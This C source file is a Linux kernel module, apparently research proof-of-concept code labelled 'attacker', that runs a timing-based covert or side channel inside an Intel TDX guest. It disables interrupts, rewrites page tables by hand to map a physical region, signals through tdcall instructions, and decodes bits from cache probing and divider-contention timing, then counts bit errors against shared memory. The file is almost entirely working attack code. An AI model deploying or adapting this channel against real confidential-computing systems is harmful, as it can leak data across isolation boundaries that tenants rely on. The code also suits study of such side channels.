#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include "int.h"


#define ATTACKER KERN_INFO "attacker: "
void invlpg(void *x) {
   asm volatile("invlpg (%0)" ::"r" (x) : "memory");
}

uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void clflush_(void *mem) {
  asm volatile("clflush (%0)"::"r"(mem):"memory");
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

char data[1024*1024] __attribute__((aligned(4096)));

const size_t SETS = 12;

size_t pp(char *addr) {
    size_t k = 1;
    mfence();
    size_t b = rdtsc_nofences();
    for (size_t i = 0; i < SETS; ++i) {
      size_t mix_i;

      do {
        mix_i = (k%17)-1;
        k *= 11;
      } while (mix_i >= SETS);

      maccess(&addr[4096*mix_i]);
    }
    lfence();
    size_t e = rdtsc_nofences();
    return e-b;
}
size_t ps(size_t end) {
    size_t cnt = 0;
    size_t h = 0;
    lfence();
    for (; end > rdtsc_nofences(); ++cnt) {
        lfence();
        size_t b = rdtsc_nofences();
        lfence();
        asm volatile(
	    ".rept 32\n"
            //"popcnt %%r8, %%r8\n"
            //"popcnt %%r9, %%r9\n"
            //"popcnt %%r10, %%r10\n"
            //"popcnt %%r11, %%r11\n"
            "divsd %%xmm0,%%xmm0\n" 
            "divsd %%xmm1,%%xmm1\n" 
            "divsd %%xmm2,%%xmm2\n" 
            "divsd %%xmm3,%%xmm3\n"
	    ".endr\n"
             ::: "r8", "r9", "r10", "r11", "memory");
       lfence();
       size_t e = rdtsc_nofences();
       lfence();
       if (e-b>450) ++h;
    }
    cnt = cnt ? cnt : 1;
    //printk("aaa: %lu\n", h);
    return (h);//*1000/cnt;
}

int init_module(void) 
{
  asm volatile("cli":::"memory");
  printk("TDX: thrd aaa\n");
  uint64_t cr3;
  asm volatile("mov %%cr3, %0":"=r"(cr3)::"memory");  
  uint64_t *pml4 = page_address(pfn_to_page(cr3/4096));
  printk("TDX: %lx\n", cr3);
  printk("TDX: %lx\n", pml4[511]);
  //if ((pml4[256]&1) == 0) {
    uint64_t *pdpt = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pml4[256] = virt_to_phys(pdpt)|3;
    uint64_t *pd = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pdpt[0] = virt_to_phys(pd)|3;
    //uint64_t *pt = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pd[0] =     0xfffffc0000000ULL|0x83;
    //pt[0] = 3|0xffffffffff000ULL;
  volatile uint64_t *addr = (uint64_t *)0xffff800000000000ULL;

  asm volatile(
	"xor %%rax, %%rax; xor %%r10, %%r10; mov $0xff00, %%rcx; mov $0x40000069, %%r12; mov $1, %%r13; mov $10, %%r11;tdcall;"
	:::"r8", "r9","r10", "r11", "r12", "r13", "r14", "r15", "rax","rcx", "rdx", "rsi", "rdi","rbx", "memory");
  invlpg(addr);
  serialize();
  printk("TDX out: %lx\n", *addr);

  unsigned long pgs = __get_free_pages(GFP_KERNEL, 9);
  memset((void*)pgs, 0, 1024ULL*1024ULL*2);
  char *addr2 = (char *)pgs+64*310;
  size_t WINDOW = 5000;
  for (size_t i = 0; i < 33; ++i) {
    printk("res: %lu", pp(addr2));
  }
  printk("next\n");
  printk("tsc: %lu\n", tsc_khz);
  for (size_t i = 0; i < 33; ++i) {
    maccess(&addr2[4096*500]);
    printk("res: %lu", pp(addr2));
  }

  const size_t LEN = 1024*128;

  *addr = 1;
  while (*addr != 2) asm volatile("":::"memory");
  serialize();
  size_t end = rdtsc_nofences();


  

  for (size_t i = 0; i < LEN; ++i) {
    end += WINDOW;
    mfence();
    size_t time = ps(end);
    //size_t time = pp(addr2);
    //printk("%lu\n", time);
    if (time>2) {
    //if (time >= 92) {
      data[i>>3] |= 1<<(i&7);
    }
    //while (rdtsc_nofences() < end)asm volatile("":::"memory");
  }
    
  
  asm volatile("sti":::"memory");

  free_pages(pgs, 9);

  volatile char *data2 = (volatile char*)(addr+2);

  size_t errors = 0;

  for (size_t i = 0; i < LEN/8; ++i) { 
    size_t out;
    size_t in = data2[i]^data[i];
    asm("popcnt %1, %0":"=r"(out):"r"(in));
    errors += out;
    printk("DATA: %hhx %hhx\n", data2[i],data[i]);
  }
  printk("errors: %lu\n", errors);




  serialize();
  asm volatile(
	"xor %%rax, %%rax; xor %%r10, %%r10; mov $0xff00, %%rcx; mov $0x40000069, %%r12; mov $2, %%r13; mov $10, %%r11;tdcall;"
	:::"r8", "r9","r10", "r11", "r12", "r13", "r14", "r15", "rax","rcx", "rdx", "rsi", "rdi","rbx", "memory");
  return 0;

} 

 

void cleanup_module(void) 
{ 
  pr_info("unload.\n"); 
  msleep(500);
} 

 

MODULE_LICENSE("GPL");
